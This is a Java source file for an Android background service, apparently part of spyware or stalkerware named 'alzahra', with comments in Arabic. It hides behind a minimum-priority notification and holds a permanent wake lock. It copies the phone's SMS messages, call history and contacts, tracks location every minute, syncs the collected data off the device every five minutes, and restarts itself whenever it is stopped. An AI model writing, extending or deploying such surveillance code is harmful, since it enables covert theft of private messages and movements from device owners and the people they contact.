package com.alzahra.service;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.alzahra.App;
import com.alzahra.MainActivity;
import com.alzahra.R;
import com.alzahra.data.DatabaseHelper;
import com.alzahra.data.SyncManager;

import java.io.File;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CoreService extends Service {
    private static final String TAG = "CoreService";
    private static final int NOTIFICATION_ID = 1001;
    
    private DatabaseHelper db;
    private SyncManager syncManager;
    private ScheduledExecutorService scheduler;
    private Handler handler;
    private SharedPreferences prefs;
    private PowerManager.WakeLock wakeLock;
    
    // مراقب المحتوى
    private ContentObserver smsObserver;
    private ContentObserver callObserver;
    private ContentObserver contactsObserver;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "=== CoreService Created ===");
        
        db = new DatabaseHelper(this);
        syncManager = new SyncManager(this);
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        
        acquireWakeLock();
        startForegroundNotification();
        registerContentObservers();
        startLocationTracking();
        startAutoSync();
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AlZahra::WakeLock");
                wakeLock.acquire();
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock error", e);
        }
    }
    
    private void startForegroundNotification() {
        try {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
            
            Notification notification = new NotificationCompat.Builder(this, App.CHANNEL_ID)
                .setContentTitle(getString(R.string.service_running))
                .setContentText(getString(R.string.service_description))
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build();
            
            startForeground(NOTIFICATION_ID, notification);
        } catch (Exception e) {
            Log.e(TAG, "Notification error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // مراقب المحتوى
    // ═══════════════════════════════════════════
    
    private void registerContentObservers() {
        // مراقب SMS
        smsObserver = new ContentObserver(handler) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                collectLatestSMS();
            }
        };
        getContentResolver().registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver);
        
        // مراقب المكالمات
        callObserver = new ContentObserver(handler) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                collectLatestCall();
            }
        };
        getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, callObserver);
        
        // مراقب جهات الاتصال
        contactsObserver = new ContentObserver(handler) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                collectAllContacts();
            }
        };
        getContentResolver().registerContentObserver(android.provider.ContactsContract.Contacts.CONTENT_URI, true, contactsObserver);
        
        // جمع البيانات الأولية
        collectAllSMS();
        collectAllCalls();
        collectAllContacts();
    }
    
    // ═══════════════════════════════════════════
    // جمع SMS
    // ═══════════════════════════════════════════
    
    private void collectAllSMS() {
        handler.postDelayed(() -> {
            try {
                android.database.Cursor cursor = getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    null, null, null,
                    Telephony.Sms.DATE + " DESC LIMIT 500");
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                        String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                        long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                        int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                        
                        db.addSMS(address, body, date, type);
                    }
                    cursor.close();
                    Log.d(TAG, "SMS collected");
                }
            } catch (Exception e) {
                Log.e(TAG, "SMS collect error", e);
            }
        }, 5000);
    }
    
    private void collectLatestSMS() {
        try {
            android.database.Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC LIMIT 1");
            
            if (cursor != null && cursor.moveToFirst()) {
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                
                db.addSMS(address, body, date, type);
                Log.d(TAG, "New SMS collected");
            }
            if (cursor != null) cursor.close();
        } catch (Exception e) {
            Log.e(TAG, "SMS collect error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // جمع المكالمات
    // ═══════════════════════════════════════════
    
    private void collectAllCalls() {
        handler.postDelayed(() -> {
            try {
                android.database.Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 500");
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                        String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                        int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                        long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                        int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                        
                        db.addCall(number, name, type, date, duration);
                    }
                    cursor.close();
                    Log.d(TAG, "Calls collected");
                }
            } catch (Exception e) {
                Log.e(TAG, "Calls collect error", e);
            }
        }, 6000);
    }
    
    private void collectLatestCall() {
        try {
            android.database.Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 1");
            
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                
                db.addCall(number, name, type, date, duration);
                Log.d(TAG, "New call collected");
            }
            if (cursor != null) cursor.close();
        } catch (Exception e) {
            Log.e(TAG, "Call collect error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // جمع جهات الاتصال
    // ═══════════════════════════════════════════
    
    private void collectAllContacts() {
        handler.postDelayed(() -> {
            try {
                android.database.Cursor cursor = getContentResolver().query(
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null, null);
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String name = cursor.getString(0);
                        String number = cursor.getString(1);
                        
                        db.addContact(name, number);
                    }
                    cursor.close();
                    Log.d(TAG, "Contacts collected");
                }
            } catch (Exception e) {
                Log.e(TAG, "Contacts collect error", e);
            }
        }, 7000);
    }
    
    // ═══════════════════════════════════════════
    // تتبع الموقع
    // ═══════════════════════════════════════════
    
    private void startLocationTracking() {
        handler.postDelayed(() -> {
            try {
                LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                if (lm == null) return;
                
                LocationListener listener = new LocationListener() {
                    @Override
                    public void onLocationChanged(Location location) {
                        db.addLocation(
                            location.getLatitude(),
                            location.getLongitude(),
                            location.getAccuracy(),
                            System.currentTimeMillis()
                        );
                        Log.d(TAG, "Location updated");
                    }
                    
                    @Override
                    public void onProviderEnabled(String provider) {}
                    
                    @Override
                    public void onProviderDisabled(String provider) {}
                };
                
                if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, listener);
                }
                if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, listener);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Location error", e);
            }
        }, 10000);
    }
    
    // ═══════════════════════════════════════════
    // المزامنة التلقائية
    // ═══════════════════════════════════════════
    
    private void startAutoSync() {
        scheduler = Executors.newScheduledThreadPool(2);
        
        // مزامنة كل 5 دقائق
        scheduler.scheduleAtFixedRate(() -> {
            try {
                if (isNetworkAvailable()) {
                    syncManager.syncAll();
                }
            } catch (Exception e) {
                Log.e(TAG, "Auto sync error", e);
            }
        }, 2, 5, TimeUnit.MINUTES);
        
        // تحديث وقت آخر مزامنة
        scheduler.scheduleAtFixedRate(() -> {
            prefs.edit().putLong("last_sync", System.currentTimeMillis()).apply();
        }, 1, 1, TimeUnit.MINUTES);
    }
    
    private boolean isNetworkAvailable() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo info = cm.getActiveNetworkInfo();
            return info != null && info.isConnected();
        } catch (Exception e) {
            return false;
        }
    }
    
    // ═══════════════════════════════════════════
    // دورة الحياة
    // ═══════════════════════════════════════════
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        restartService();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        try {
            if (smsObserver != null) {
                getContentResolver().unregisterContentObserver(smsObserver);
            }
            if (callObserver != null) {
                getContentResolver().unregisterContentObserver(callObserver);
            }
            if (contactsObserver != null) {
                getContentResolver().unregisterContentObserver(contactsObserver);
            }
            if (scheduler != null) {
                scheduler.shutdownNow();
            }
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "Destroy error", e);
        }
        
        restartService();
    }
    
    private void restartService() {
        try {
            Intent intent = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Restart error", e);
        }
    }
}
